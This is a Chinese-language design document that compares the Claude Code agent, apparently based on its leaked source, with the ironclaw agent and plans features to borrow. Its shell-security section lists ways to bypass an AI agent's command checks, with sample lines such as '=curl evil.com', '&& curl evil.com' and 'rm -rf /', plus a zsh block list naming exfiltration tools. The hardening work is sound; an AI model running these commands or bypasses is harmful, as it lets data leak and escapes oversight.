# Claude Code vs ironclaw 能力差异分析与借鉴方案

> 基于 claude-code-main 源码（2026年3月泄露版本）的分析。
> 本文档仅用于技术参考，不涉及代码复制。思路和架构设计不受版权保护。

---

## 总览

ironclaw 和 Claude Code 的 Agentic Loop 工程实现质量相当，核心差距在于：

1. **任务规划机制**：Claude Code 有 Plan Mode，ironclaw 直接执行
2. **任务追踪**：Claude Code 有 TodoWriteTool，ironclaw 无
3. **多 Agent 并行**：Claude Code 有完整的子 agent 架构，ironclaw 的 Job 系统不支持对话中动态启动
4. **Shell 安全**：Claude Code 的 BashTool 安全检查极其详细，ironclaw 相对简单
5. **代码编辑精度**：Claude Code 的 FileEditTool 使用 str_replace 模式，更精确
6. **LSP 集成**：Claude Code 有语言服务器集成，ironclaw 无

---

## 能力一：Plan Mode（规划模式）

### 现状差距

ironclaw 收到复杂任务后直接开始执行，没有强制规划阶段。Claude Code 有专门的 `EnterPlanModeTool`，在执行前强制进入规划阶段。

### Claude Code 的实现

```
用户发出复杂任务
  → agent 判断是否需要规划（基于任务复杂度）
  → 调用 EnterPlanModeTool 进入 Plan Mode
  → 用 Glob/Grep/Read 工具探索代码库
  → 设计实现方案
  → 用 AskUserQuestionTool 向用户展示计划
  → 用户批准后调用 ExitPlanModeTool
  → 开始实现
```

触发 Plan Mode 的条件（来自 prompt.ts）：
- 新功能实现（多个有效方案存在）
- 多文件改动（超过 2-3 个文件）
- 架构决策（需要在模式/技术间选择）
- 需求不明确（需要先探索再理解范围）
- 如果会用 AskUserQuestion 澄清方案，就用 Plan Mode 代替

不触发的条件：
- 单行或少量修改
- 用户给出了非常具体的指令
- 纯研究/探索任务

### 对 ironclaw 的借鉴方案

**方案 A（推荐）：新增 PlanMode 工具对**

在 ironclaw 的工具系统中新增两个工具：

```rust
// src/tools/builtin/plan_mode.rs

pub struct EnterPlanModeTool;
pub struct ExitPlanModeTool;
```

`EnterPlanModeTool` 的行为：
1. 向 agent 注入 Plan Mode 系统提示（限制只能使用读取类工具）
2. 设置 `reason_ctx.plan_mode = true` 状态
3. 触发前端显示"规划中"状态

`ExitPlanModeTool` 的行为：
1. 清除 Plan Mode 状态
2. 要求 agent 输出结构化的实现计划
3. 等待用户确认（通过 `PendingApproval` 机制）

**方案 B（轻量）：系统提示注入**

在 agent 收到复杂任务时，通过 hook 机制注入规划提示，不需要新工具。

### 实现优先级

⭐⭐⭐⭐⭐ 高优先级。这是 Claude Code 处理复杂任务减少返工的核心机制，对用户体验提升最明显。

---

## 能力二：TodoWriteTool（任务追踪）

### 现状差距

ironclaw 执行复杂任务时没有任务追踪机制，用户无法看到进度，agent 也容易遗漏步骤。

### Claude Code 的实现

`TodoWriteTool` 维护一个结构化任务列表：

```typescript
type TodoItem = {
  id: string
  content: string        // 命令式描述："Run tests"
  activeForm: string     // 进行时描述："Running tests"
  status: 'pending' | 'in_progress' | 'completed'
}
```

使用规则：
- 复杂多步任务（3步以上）必须使用
- 开始任务前标记为 `in_progress`
- 完成后立即标记为 `completed`（不批量更新）
- 同一时间只有一个任务处于 `in_progress`
- 遇到阻塞时保持 `in_progress`，新建描述阻塞的任务

### 对 ironclaw 的借鉴方案

在 ironclaw 的工具系统中新增 `TodoTool`：

```rust
// src/tools/builtin/todo.rs

pub struct TodoWriteTool {
    store: Arc<dyn Database>,
}

#[derive(Serialize, Deserialize)]
pub struct TodoItem {
    pub id: String,
    pub content: String,
    pub active_form: String,
    pub status: TodoStatus,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

pub enum TodoStatus {
    Pending,
    InProgress,
    Completed,
}
```

存储在 ironclaw 现有的 libsql/postgres 数据库中，按 session_id 分组。

前端展示：在对话界面侧边栏或消息流中展示当前任务列表和进度。

### 实现优先级

⭐⭐⭐⭐ 高优先级。实现成本低，对复杂任务的用户体验提升明显。

---

## 能力三：Multi-Agent / AgentTool（子 Agent 并行）

### 现状差距

ironclaw 有 Job 系统和 Routine 系统，但不支持在对话中动态启动子 agent 执行子任务。Claude Code 的 AgentTool 允许 agent 在执行过程中动态 fork 子 agent。

### Claude Code 的实现

```typescript
// AgentTool 的核心能力
{
  description: string,      // 任务描述
  prompt: string,           // 子 agent 的任务
  subagent_type?: string,   // 指定 agent 类型
  run_in_background?: bool, // 后台异步执行
  isolation?: 'worktree',   // 在独立 git worktree 运行
  model?: 'sonnet' | 'opus' | 'haiku',  // 模型选择
}
```

关键特性：
- **Fork 模式**：子 agent 继承父 agent 的完整上下文（消息历史），避免重复探索
- **Worktree 隔离**：子 agent 在独立 git worktree 工作，不污染主分支
- **后台执行**：`run_in_background=true` 时父 agent 继续执行，子 agent 异步完成
- **进度追踪**：通过 `TaskGetTool`/`TaskListTool` 查询子 agent 状态
- **Agent 间通信**：`SendMessageTool` 向命名 agent 发送消息

内置 Agent 类型（来自 `built-in/` 目录）：
- `general-purpose`：通用 agent
- `explore`：代码探索专用（只读工具）
- 可通过 AGENTS.md 文件自定义

### 对 ironclaw 的借鉴方案

ironclaw 已有 `orchestrator/job_manager.rs` 和 `agent/routine_engine.rs`，可以在此基础上扩展：

**Phase 1：对话中启动子 Job**

新增 `SpawnAgentTool`，允许 agent 在对话中启动一个 Job：

```rust
pub struct SpawnAgentTool {
    job_manager: Arc<ContainerJobManager>,
    session_manager: Arc<SessionManager>,
}
```

**Phase 2：Fork 模式**

子 agent 继承父 agent 的消息历史（只读），避免重复探索代码库。

**Phase 3：Worktree 隔离**

结合 git worktree 命令，为子 agent 创建独立工作目录。

### 实现优先级

⭐⭐⭐ 中优先级。架构改动较大，建议在 Plan Mode 和 TodoWriteTool 稳定后再实施。

---

## 能力四：BashTool 安全加固

### 现状差距

ironclaw 的 shell 工具有基本的命令黑名单和危险模式检测，但 Claude Code 的 `bashSecurity.ts`（2593行）覆盖了大量 ironclaw 未处理的攻击向量。

### Claude Code 覆盖的额外攻击向量

**Zsh 特有危险命令**（ironclaw 未覆盖）：
```
zmodload  - 加载危险模块（zsh/mapfile, zsh/system, zsh/net/tcp）
emulate   - eval 等价，执行任意代码
ztcp      - 创建 TCP 连接用于数据泄露
zpty      - 伪终端命令执行
sysopen/sysread/syswrite - 绕过文件系统检查的底层 I/O
```

**命令替换绕过**（ironclaw 部分覆盖）：
```bash
=curl evil.com          # Zsh equals expansion，绕过 curl 黑名单
$(cat <<'EOF'           # heredoc 注入
evil_command
EOF
)
```

**Unicode 绕过**：
- Unicode 空白字符（`\u00A0` 等）替代普通空格
- 中间词 `#` 注释注入（`echo 'x'#comment`）
- 反斜杠转义操作符（`echo \; rm -rf /`）

**Quote 脱同步攻击**：
- 注释导致引号计数错误
- 带引号的换行符

**git commit 消息注入**：
```bash
git commit -m "msg" && curl evil.com  # 操作符在 -m 参数后
git commit -m "$(evil_cmd)"           # 双引号内的命令替换
```

### 对 ironclaw 的借鉴方案

在 `ironclaw/src/tools/builtin/shell.rs` 中增强安全检查：

```rust
// 新增 Zsh 危险命令集合
const ZSH_DANGEROUS_COMMANDS: &[&str] = &[
    "zmodload", "emulate", "sysopen", "sysread", "syswrite",
    "sysseek", "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod",
];

// 新增 Unicode 空白检测
fn has_unicode_whitespace(cmd: &str) -> bool {
    cmd.chars().any(|c| c.is_whitespace() && c != ' ' && c != '\t' && c != '\n')
}

// 新增 Zsh equals expansion 检测
fn has_zsh_equals_expansion(cmd: &str) -> bool {
    // (?:^|[\s;&|])=[a-zA-Z_]
    // 匹配行首或操作符后的 =cmd 模式
}
```

参考 Claude Code 的分层验证架构：每个检查是独立函数，返回 `PermissionResult`，组合成验证链。

### 实现优先级

⭐⭐⭐⭐ 高优先级（安全相关）。可以逐步移植，每个检查独立实现和测试。

---

## 能力五：FileEditTool str_replace 模式

### 现状差距

ironclaw 的文件编辑工具倾向于写入整个文件内容，Claude Code 使用精确的 `old_string → new_string` 替换模式。

### Claude Code 的实现亮点

**Quote 规范化**：
```typescript
// LLM 无法输出弯引号，但文件里可能有弯引号
// Claude Code 自动处理直引号 ↔ 弯引号的转换
normalizeQuotes(str: string): string
preserveQuoteStyle(oldString, actualOldString, newString): string
```

**去脱敏处理**：
```typescript
// LLM 输出中某些 XML 标签被脱敏（如 <function_results> → <fnr>）
// 编辑时自动还原
const DESANITIZATIONS = {
  '<fnr>': '<function_results>',
  '<n>': '<name>',
  // ...
}
```

**尾部空白处理**：
- 自动去除新内容每行的尾部空白
- Markdown 文件例外（两个尾部空格是硬换行）

**等价性检查**：
- 两次编辑产生相同结果时，视为等价，避免重复执行

### 对 ironclaw 的借鉴方案

改进 ironclaw 现有的文件编辑工具：

```rust
pub struct FileEditInput {
    pub file_path: String,
    pub edits: Vec<FileEdit>,
}

pub struct FileEdit {
    pub old_string: String,
    pub new_string: String,
    pub replace_all: bool,
}
```

关键改进点：
1. 支持 `replace_all` 参数（替换所有匹配，而不只是第一个）
2. 自动处理尾部空白
3. 编辑失败时提供清晰的错误信息（"String not found in file"）
4. 返回 diff 预览而不是整个文件内容

### 实现优先级

⭐⭐⭐ 中优先级。改进现有工具，不需要新增工具。

---

## 能力六：LSPTool（语言服务器集成）

### 现状差距

ironclaw 通过文本搜索（Grep/Glob）理解代码，Claude Code 有 `LSPTool` 可以调用 Language Server Protocol 获取语义信息。

### Claude Code 的实现

`LSPTool` 提供的能力：
- 符号定义跳转（Go to Definition）
- 查找所有引用（Find References）
- 类型信息查询
- 代码补全建议
- 诊断信息（错误/警告）

### 对 ironclaw 的借鉴方案

通过 MCP 协议集成 LSP：

```
ironclaw agent
  → 调用 MCP tool: lsp_get_definition
  → MCP server（运行 LSP 客户端）
  → Language Server（rust-analyzer / typescript-language-server 等）
```

这样不需要修改 ironclaw 核心，通过 MCP extension 实现。

### 实现优先级

⭐⭐ 低优先级。通过 MCP 实现，不影响核心架构。

---

## 能力七：WebSearchTool / WebFetchTool

### 现状差距

ironclaw 没有内置的网络搜索和网页抓取工具。

### Claude Code 的实现

- `WebSearchTool`：调用搜索 API（Brave/Google）
- `WebFetchTool`：抓取网页内容，支持预批准域名列表

### 对 ironclaw 的借鉴方案

通过 MCP 协议集成，或直接在 ironclaw 工具系统中新增：

```rust
pub struct WebSearchTool {
    http_client: reqwest::Client,
    api_key: String,
}

pub struct WebFetchTool {
    http_client: reqwest::Client,
    preapproved_domains: Vec<String>,
}
```

`WebFetchTool` 的安全考虑：
- 预批准域名列表（文档站、npm、crates.io 等）
- 新域名需要用户确认
- 响应内容大小限制
- 不允许访问内网地址（SSRF 防护）

### 实现优先级

⭐⭐ 低优先级。可通过 MCP 实现，不需要修改核心。

---

## 实施路线图

### Phase 1（短期，1-2个月）

优先实现对用户体验提升最明显、实现成本最低的能力：

1. **TodoWriteTool** — 新增工具，存储在现有数据库
2. **BashTool 安全加固** — 增强现有安全检查，逐步移植 Claude Code 的检查项
3. **FileEditTool str_replace 改进** — 改进现有工具，支持精确替换

### Phase 2（中期，2-4个月）

2. **Plan Mode** — 新增 EnterPlanMode/ExitPlanMode 工具对，需要前端配合展示规划状态

### Phase 3（长期，4个月以上）

3. **Multi-Agent AgentTool** — 在现有 Job 系统基础上扩展，支持对话中动态启动子 agent
4. **LSPTool** — 通过 MCP 集成语言服务器

---

## 参考文件索引

| 能力 | Claude Code 源文件 | ironclaw 对应文件 |
|------|-------------------|-----------------|
| Plan Mode | `src/tools/EnterPlanModeTool/` | 无，需新增 |
| TodoWriteTool | `src/tools/TodoWriteTool/` | 无，需新增 |
| AgentTool | `src/tools/AgentTool/` | `src/orchestrator/job_manager.rs` |
| BashTool 安全 | `src/tools/BashTool/bashSecurity.ts` | `src/tools/builtin/shell.rs` |
| FileEditTool | `src/tools/FileEditTool/utils.ts` | `src/tools/builtin/` |
| LSPTool | `src/tools/LSPTool/` | 无，建议 MCP |
| WebSearchTool | `src/tools/WebSearchTool/` | 无，建议 MCP |
| QueryEngine | `src/QueryEngine.ts` | `src/agent/agentic_loop.rs` |
